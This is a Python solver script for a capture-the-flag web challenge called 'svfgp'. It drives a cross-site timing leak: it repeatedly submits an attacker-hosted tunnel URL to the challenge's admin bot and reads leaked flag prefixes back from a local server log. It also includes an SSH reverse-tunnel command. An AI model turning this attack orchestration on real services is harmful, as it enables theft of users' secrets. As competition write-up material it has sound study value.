#!/usr/bin/env python3
"""
Challenge: svfgp
Category:  web (XS-Leak timing side-channel)
Platform:  UNbreakable International 2026

Timing oracle via probe mode: PBKDF2 with 3M iterations runs only
when the candidate is a correct prefix of the sealed secret.
Uses postMessage timing to exfiltrate the flag char by char.

Usage:
  1. Start server: python3 server.py > server.log 2>&1 &
  2. Start tunnel: ssh -R 80:localhost:9999 nokey@localhost.run
  3. Run solver:   python3 solve.py <tunnel_url> [known_prefix]
"""
import sys
import json
import time
import re
import urllib.parse
import requests

BOT_URL = "https://svfgp-bot.breakable.live"
LOG_FILE = "server.log"


def submit_to_bot(url):
    """Submit URL to bot, return job ID."""
    try:
        resp = requests.post(
            f"{BOT_URL}/api/submit",
            json={"url": url},
            timeout=15,
        )
        data = resp.json()
        job = data.get("job", {})
        print(f"[*] Job {job.get('id', '?')[:8]} submitted")
        return job.get("id")
    except Exception as e:
        print(f"[-] Submit error: {e}")
        return None


def poll_job(job_id, timeout=90):
    """Wait for job to complete."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            resp = requests.get(f"{BOT_URL}/api/jobs/{job_id}", timeout=10)
            if resp.ok:
                status = resp.json().get("job", {}).get("status")
                if status in ("done", "error"):
                    return status
        except:
            pass
        time.sleep(3)
    return "timeout"


def read_progress(log_file):
    """Read the latest progress from server log."""
    best = ""
    flag = None
    try:
        with open(log_file) as f:
            for line in f:
                # Match progress reports
                m = re.search(r'\] p = (.+)', line)
                if m and len(m.group(1)) > len(best):
                    best = m.group(1)
                m = re.search(r'\] flag = (.+)', line)
                if m:
                    flag = m.group(1)
                m = re.search(r'\] done = (.+)', line)
                if m and len(m.group(1)) > len(best):
                    best = m.group(1)
    except FileNotFoundError:
        pass
    return flag or best


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <tunnel_url> [known_prefix]")
        print("  Requires server.py running on :9999 and SSH tunnel active.")
        return

    tunnel_url = sys.argv[1].rstrip("/")
    known = sys.argv[2] if len(sys.argv) > 2 else ""

    print(f"[*] Tunnel: {tunnel_url}")
    print(f"[*] Starting prefix: {repr(known)}")
    print(f"[*] Reading results from: {LOG_FILE}")
    print()

    iteration = 0
    while True:
        iteration += 1
        exploit_url = f"{tunnel_url}/#{urllib.parse.quote(known)}"

        print(f"{'='*60}")
        print(f"[*] Iteration {iteration}")
        print(f"[*] Known: {repr(known)} ({len(known)} chars)")
        print(f"[*] URL: {exploit_url[:80]}...")

        # Clear log for this run
        with open(LOG_FILE, "w") as f:
            f.write("")

        job_id = submit_to_bot(exploit_url)
        if not job_id:
            print("[-] Failed to submit. Retry in 5s...")
            time.sleep(5)
            continue

        # Wait for job to complete
        print("[*] Waiting for bot to finish...")
        status = poll_job(job_id)
        print(f"[*] Job status: {status}")

        # Read results
        time.sleep(2)
        result = read_progress(LOG_FILE)

        if result.endswith("}"):
            print(f"\n[+] FLAG FOUND: {result}")
            return

        if len(result) > len(known):
            print(f"[+] Progress: {known} -> {result}")
            known = result
        else:
            print("[-] No progress this round.")
            resp = input("    Retry? [Y/n] ").strip().lower()
            if resp == "n":
                break

    print(f"\n[*] Final: {known}")


if __name__ == "__main__":
    main()
